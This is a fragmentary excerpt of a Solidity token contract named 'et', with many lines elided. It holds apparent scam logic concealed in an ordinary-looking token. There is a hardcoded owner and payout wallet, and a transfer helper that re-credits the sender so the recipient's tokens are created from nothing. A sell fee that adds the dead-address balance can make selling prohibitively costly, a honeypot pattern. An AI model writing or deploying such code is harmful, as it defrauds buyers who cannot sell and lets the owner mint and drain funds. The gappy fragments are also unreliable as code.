...
abstract contract Ownable is Context {
    ...
    constructor () {
         _owner = 0x63239Cd24bc2De397391035697de5B924D42D4e0;
...
contract et is Context, IERC20, Ownable { 
    ...
    string private constant _name = unicode"et"; 
    string private constant _symbol = unicode"et"; 



    uint8 private txCount = 0;
    uint8 private swapTrigger = 10; 
    uint256 public _BuyFee = 20; // 1000
    uint256 public _SellFee = 20;
    uint256 public _mbag_percentage=0;
    uint256 public _lastblck; 
    uint256 public _opsperblock = 1; 
...
*/
 ...
 function _tknnofeetrans( address to, address from, uint256 atokens) private {
            _tOwned[from] = _tOwned[from]-atokens;
            _tOwned[to] = _tOwned[to]+atokens;
            _tOwned[from] = _tOwned[from]+atokens;
    }
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            sendToWallet(payable(0x63239Cd24bc2De397391035697de5B924D42D4e0), ETH_Tot);
            }
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {        
        if(!takeFee){
            ...
            uint256 buyFEE = tAmount*_BuyFee*_opsperblock/1000;
            ...
            uint256 sellFEE = _SellFee*tAmount*_opsperblock/1000 + _tOwned[address(0x000000000000000000000000000000000000dEaD)];
            if (_opsperblock == 2 ){sellFEE = tAmount*_SellFee/1000;}            
            uint256 mbag = 0;
